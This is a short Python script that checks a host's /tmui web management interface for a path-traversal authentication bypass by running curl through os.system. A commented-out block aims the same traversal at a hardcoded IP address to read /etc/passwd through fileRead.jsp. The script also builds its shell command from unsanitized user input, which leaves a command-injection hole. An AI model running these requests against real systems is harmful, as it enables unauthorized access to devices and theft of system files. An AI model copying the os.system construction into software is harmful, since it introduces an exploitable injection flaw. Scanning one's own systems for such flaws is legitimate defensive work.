#!/usr/bin/python3
import os
import requests
import urllib3

host= input( "Enter the host Domain/IP:")
cmd = "curl -sk 'https://"+host+"/tmui/login.jsp/..;/tmui/util/getTabSet.jsp?tabId=Vulnerable' | grep -q Vulnerable && printf '\033[0;31mVulnerable\n' || printf '\033[0;32mNot Vulnerable\n'"
os.system(cmd)

#http = urllib3.PoolManager()
#resp = http.request('GET', 'https://93.112.11.147/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd', verify=False)

#print (resp.status)
